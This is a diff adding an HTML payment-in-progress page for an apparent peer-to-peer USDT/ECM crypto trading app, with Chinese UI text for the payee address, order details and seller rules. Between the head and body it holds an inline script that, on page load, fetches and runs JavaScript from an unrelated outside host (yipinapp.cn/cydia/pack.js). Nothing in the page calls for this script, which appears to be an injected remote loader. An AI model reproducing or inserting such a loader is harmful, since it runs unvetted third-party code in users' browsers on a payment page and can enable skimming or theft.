@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>进行中</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<!--<link rel="stylesheet" href="../../static/css/weui-min.css">-->
+		<link rel="stylesheet" href="../../static/css/weui-jquery.css">
+		<link rel="stylesheet" href="../../static/css/transaction/payIng.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns" id="arrow">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">进行中</div>
+		    <span class="weui-pull-right weui-cell__ft">联系商家</span>
+		</header>
+		<div class="orderStaute">
+			<h2 class="statusName">请付款</h2>
+			<p class="orderTxt">请在 <span class="countdown"></span>内付款给商家</p>
+			<div class="orderDetail">
+				<div class="payTitle">
+					<div class="titleBg">
+						<p>待支付</p>
+						<h2 class="changeColor" style="font-size: 16px">USDT<span class="payMoney"></span></h2>
+					</div>
+					<div class="titleright">
+						<p>交易单价：<span class="trandeceil"></span>USDT</p>
+						<p>交易数量：<span class="trandeNum"></span> <span class="unit">ECM</span></p>
+					</div>
+				</div>
+				<div class="floorTep">
+					<ul>
+<!--						<a class="weui-cell weui-cell_access weui-cell_example">
+
+							<div class="weui-cell__bd weui-cell_primary">
+					        	<p class="weImg">
+					        		<img src="../../static/images/weixin.png" />
+					        		<span class="payKind"></span>
+					        	</p>
+					    	</div>
+							<span class="weui-cell__ft changeBtn">更换支付方式</span>
+					    </a>-->
+						<li class="weui-cell weui-cell_access">
+							<div class="weui-cell__bd weui-cell_primary">
+								<p class="weImg">
+									<img src="../../static/images/weixin.png" />
+									<span class="payKind">ECM WALEAT</span>
+								</p>
+							</div>
+						</li>
+						<li class="qroding">
+							<p>收款人</p>
+							<p class="payee"></p>
+						</li>
+<!--						<li class="qrcodePep">
+							<p>收款二维码</p>
+							<p><img id="pb1" src="../../static/images/erweima.png" data-img="" /></p>
+						</li>-->
+						<li class="bankDiv">
+							<p><span class="noName"></span>收款地址</p>
+							<p class="bankNo"></p>
+						</li>
+						<li>
+							<p>订单号</p>
+							<p class="orderNO"></p>
+						</li>
+						<li>
+							<p>参考号</p>
+							<p class="receipt"></p>
+						</li>
+					</ul>
+				</div>
+				<div class="lastDiv">
+					<p> 如您已向卖家转账付款，请务必点击"标记为已支付"按钮，否则有可能造成资金损失。</p>
+					<div class="twoBtn">
+						<button type="button" class="weui-btn addShip">取消订单</button>
+						<button type="button" class="weui-btn poster">标记为已支付</button>
+					</div>
+				</div>
+			</div>
+			<div class="noticeTxt">
+				<h4><img src="../../static/images/tixiang.png" />交易提醒</h4>
+				<ul>
+					<li>您的汇款将直接进入卖家账户，交易过程中卖家出售的数字资产由平台托管保护。</li>
+					<li>请在规定时间内完成付款,  并务必点击"我已付款"，卖家确认收款后，系统会将数字资产划转到您的账户。</li>
+					<li>卖方当日取消订单，将取消当日卖出资格</li>
+					<li>卖方当日未放币，导致订单失败的，核实后，扣除资产池10000币，并取消次日卖出资格</li>
+				</ul>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/fastclick.js" ></script>
+		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.min.js" ></script>
+		<script type="text/javascript" src="../../lib/swiper.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/payIng.js" ></script>
+	</body>
+</html>
